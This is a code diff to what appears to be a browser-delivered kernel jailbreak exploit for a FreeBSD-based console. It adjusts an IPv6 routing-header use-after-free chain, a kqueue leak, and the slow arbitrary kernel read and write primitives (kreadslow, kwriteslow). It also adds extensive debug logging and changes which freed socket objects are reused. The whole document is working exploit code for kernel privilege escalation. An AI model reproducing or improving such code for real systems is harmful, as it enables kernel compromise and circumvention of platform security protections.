@@ -139,10 +139,10 @@ const MAIN_LOOP_ITERATIONS = 3
 const TRIPLEFREE_ITERATIONS = 8
 const KQUEUE_ITERATIONS = 5000
 
-const MAX_ROUNDS_TWIN = 10
+const MAX_ROUNDS_TWIN = 5
 const MAX_ROUNDS_TRIPLET = 200
 
-const MAIN_CORE = 7
+const MAIN_CORE = 4
 const MAIN_RTPRIO = 0x100
 
 const RTP_LOOKUP = 0
@@ -1102,22 +1102,47 @@ function setup_arbitrary_rw () {
 }
 
 function find_allproc () {
+  debug('find_allproc - Creating pipe...')
   pipe(pipe_sock)
   const pipe_0 = read32(pipe_sock)
   const pipe_1 = read32(pipe_sock.add(0x04))
+  debug('find_allproc - pipe fds: ' + pipe_0 + ', ' + pipe_1)
 
-  write32(sockopt_val_buf, Number(getpid()))
+  debug('find_allproc - Writing pid to buffer...')
+  const pid = Number(getpid())
+  debug('find_allproc - pid: ' + pid)
+  write32(sockopt_val_buf, pid)
+  debug('find_allproc - Calling ioctl FIOSETOWN...')
   ioctl(new BigInt(pipe_0), FIOSETOWN, sockopt_val_buf)
+  debug('find_allproc - ioctl done')
 
+  debug('find_allproc - Getting fp...')
   const fp = fget(pipe_0)
+  debug('find_allproc - fp: ' + hex(fp))
+
+  debug('find_allproc - Reading f_data...')
   const f_data = kread64(fp.add(0x00))
+  debug('find_allproc - f_data: ' + hex(f_data))
+
+  debug('find_allproc - Reading pipe_sigio...')
   const pipe_sigio = kread64(f_data.add(0xd0))
+  debug('find_allproc - pipe_sigio: ' + hex(pipe_sigio))
+
+  debug('find_allproc - Reading p...')
   let p = kread64(pipe_sigio)
+  debug('find_allproc - initial p: ' + hex(p))
   kernel.addr.curproc = p // Set global curproc
 
+  debug('find_allproc - Walking process list...')
+  let walk_count = 0
   while (!(p.and(new BigInt(0xFFFFFFFF, 0x00000000))).eq(new BigInt(0xFFFFFFFF, 0x00000000))) {
     p = kread64(p.add(0x08)) // p_list.le_prev
+    walk_count++
+    if (walk_count % 100 === 0) {
+      debug('find_allproc - walk_count: ' + walk_count + ' p: ' + hex(p))
+    }
   }
+  debug('find_allproc - Found allproc after ' + walk_count + ' iterations')
 
   close(new BigInt(pipe_1))
   close(new BigInt(pipe_0))
@@ -1126,12 +1151,14 @@ function find_allproc () {
 }
 
 function jailbreak () {
+  debug('jailbreak - Starting...')
   if (!kernel_offset) {
     throw new Error('Kernel offsets not loaded')
   }
   if (FW_VERSION === null) {
     throw new Error('FW_VERSION is null')
   }
+  debug('jailbreak - Calling find_allproc...')
   kernel.addr.allproc = find_allproc() // Set global allproc
   debug('allproc: ' + hex(kernel.addr.allproc))
 
@@ -1425,8 +1452,8 @@ function leak_kqueue () {
   // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
   debug('Leaking kqueue...')
 
-  // Free one. From this point we are going to use only twins
-  free_rthdr(ipv6_socks[triplets[2]])
+  // Free one.
+  free_rthdr(ipv6_socks[triplets[1]])
 
   // Leak kqueue.
   let kq = new BigInt(0)
@@ -1447,6 +1474,7 @@ function leak_kqueue () {
     }
 
     close(kq)
+    sched_yield()
     count++
   }
   if (count === KQUEUE_ITERATIONS) {
@@ -1474,9 +1502,8 @@ function leak_kqueue () {
   // Close kqueue to free buffer.
   close(kq)
 
-  // Find triplet.
-  // No need we discarded triplets[2] and we only use twins from now on
-  // triplets[1] = find_triplet(triplets[0], -1);
+  // Find new triplets[1]
+  triplets[1] = find_triplet(triplets[0], triplets[2])
 
   return true
 }
@@ -1507,6 +1534,15 @@ function kreadslow (addr: BigInt, size: number) {
   // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
   debug('Enter kreadslow addr: ' + hex(addr) + ' size : ' + size)
 
+  // Memory exhaustion check
+  if (debugging.info.memory.available === 0) {
+    log('kreadslow - Memory exhausted before start')
+    cleanup()
+    return BigInt_Error
+  }
+
+  debug('kreadslow - Preparing buffers...')
+
   // Prepare leak buffers.
   const leak_buffers = new Array(UIO_THREAD_NUM)
   for (let i = 0; i < UIO_THREAD_NUM; i++) {
@@ -1523,11 +1559,15 @@ function kreadslow (addr: BigInt, size: number) {
   // Set iov length
   write64(uioIovRead.add(0x08), size)
 
+  debug('kreadslow - Freeing triplets[1]=' + triplets[1])
+
   // Free one.
   free_rthdr(ipv6_socks[triplets[1]])
 
   // Minimize footprint
   const uio_leak_add = leak_rthdr.add(0x08)
+
+  debug('kreadslow - Starting uio reclaim loop...')
 
   let count = 0
   let zeroMemoryCount = 0
@@ -1569,33 +1609,33 @@ function kreadslow (addr: BigInt, size: number) {
   }
 
   if (count === 10000) {
-    debug('kreadslow - Failed')
+    debug('kreadslow - Failed uio reclaim after 10000 iterations')
     return BigInt_Error
   }
 
+  debug('kreadslow - uio reclaim succeeded after ' + count + ' iterations')
+
   const uio_iov = read64(leak_rthdr)
-  // debug("This is uio_iov: " + hex(uio_iov));
+  debug('kreadslow - uio_iov: ' + hex(uio_iov))
 
   // Prepare uio reclaim buffer.
   build_uio(msgIov, uio_iov, 0, true, addr, size)
 
-  // Find new one to free
-  triplets[1] = find_triplet(triplets[0], -1, 1000)
-
-  if (triplets[1] === -1) {
-    debug('kreadslow - Failed to adquire twin')
-    return BigInt_Error
-  }
+  debug('kreadslow - Freeing triplets[2]=' + triplets[2])
 
   // Free second one.
-  free_rthdr(ipv6_socks[triplets[1]])
+  free_rthdr(ipv6_socks[triplets[2]])
 
   // Minimize footprint
   const iov_leak_add = leak_rthdr.add(0x20)
 
+  debug('kreadslow - Starting iov reclaim loop...')
+
   // Reclaim uio with iov.
   let zeroMemoryCount2 = 0
+  let count2 = 0
   while (true) {
+    count2++
     if (debugging.info.memory.available === 0) {
       zeroMemoryCount2++
       if (zeroMemoryCount2 >= 5) {
@@ -1614,7 +1654,7 @@ function kreadslow (addr: BigInt, size: number) {
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40)
 
     if (read32(iov_leak_add) === UIO_SYSSPACE) {
-      // debug("Break on reclaim uio with iov");
+      debug('kreadslow - iov reclaim succeeded after ' + count2 + ' iterations')
       break
     }
 
@@ -1624,6 +1664,8 @@ function kreadslow (addr: BigInt, size: number) {
     read(new BigInt(iov_sock_0), tmp, 1)
   }
 
+  debug('kreadslow - Reading leak buffers...')
+
   // Wake up all threads.
   read(new BigInt(uio_sock_0), tmp, size)
   // Read the results now.
@@ -1632,31 +1674,30 @@ function kreadslow (addr: BigInt, size: number) {
   const tag_val = new BigInt(0x41414141, 0x41414141)
 
   // Get leak.
-  // debug("Before getting leak");
   for (let i = 0; i < UIO_THREAD_NUM; i++) {
     read(new BigInt(uio_sock_0), leak_buffers[i], size)
     const val = read64(leak_buffers[i])
-    // debug("I read from leak_buffers[" + i + "] : " + hex(val) );
+    debug('kreadslow - leak_buffers[' + i + ']: ' + hex(val))
     if (!val.eq(tag_val)) {
+      debug('kreadslow - Found valid leak at index ' + i + ', finding triplets[1]...')
       // Find triplet.
-      triplets[1] = find_triplet(triplets[0], -1, 1000)
-      if (triplets[1] === -1) {
-        debug('kreadslow - Failed to adquire twin 2')
-        return BigInt_Error
-      }
+      triplets[1] = find_triplet(triplets[0], -1)
+      debug('kreadslow - triplets[1]=' + triplets[1])
       leak_buffer = leak_buffers[i].add(0)
-      // debug("This is leak_buffer " + hex(leak_buffer) + " - " + hex(read64(leak_buffer)));
     }
   }
-  // debug("After getting leak");
+
   // Workers should have finished earlier no need to wait
   wait_uio_writev()
 
   // Release iov spray.
   write(new BigInt(iov_sock_1), tmp, 1)
 
-  // Find triplet.
-  // triplets[2] = find_triplet(triplets[0], triplets[1], 500);
+  debug('kreadslow - Finding triplets[2]...')
+
+  // Find triplet[2].
+  triplets[2] = find_triplet(triplets[0], triplets[1])
+  debug('kreadslow - triplets[2]=' + triplets[2])
 
   // Let's make sure that they are indeed triplets
   // const leak_0 = malloc(8);
@@ -1672,6 +1713,8 @@ function kreadslow (addr: BigInt, size: number) {
   // Workers should have finished earlier no need to wait
   wait_iov_recvmsg()
   read(new BigInt(iov_sock_0), tmp, 1)
+
+  debug('kreadslow - Done, returning leak_buffer: ' + hex(leak_buffer))
 
   return leak_buffer
 }
@@ -1731,16 +1774,8 @@ function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
   // Prepare uio reclaim buffer.
   build_uio(msgIov, uio_iov, 0, false, addr, size)
 
-  // Find new one to free
-  triplets[1] = find_triplet(triplets[0], -1, 1000)
-
-  if (triplets[1] === -1) {
-    debug('kwriteslow - Failed to adquire twin')
-    return BigInt_Error
-  }
-
   // Free second one.
-  free_rthdr(ipv6_socks[triplets[1]])
+  free_rthdr(ipv6_socks[triplets[2]])
 
   // Minimize footprint
   const iov_leak_add = leak_rthdr.add(0x20)
@@ -1782,16 +1817,16 @@ function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
   }
 
   // Find triplet.
-  triplets[1] = find_triplet(triplets[0], -1, 1000)
+  triplets[1] = find_triplet(triplets[0], -1)
 
   // Workers should have finished earlier no need to wait
-  wait_uio_writev()
+  wait_uio_readv()
 
   // Release iov spray.
   write(new BigInt(iov_sock_1), tmp, 1)
 
-  // Find triplet.
-  // triplets[2] = find_triplet(triplets[0], triplets[1], 500);
+  // Find triplet[2].
+  triplets[2] = find_triplet(triplets[0], triplets[1])
 
   // Workers should have finished earlier no need to wait
   wait_iov_recvmsg()
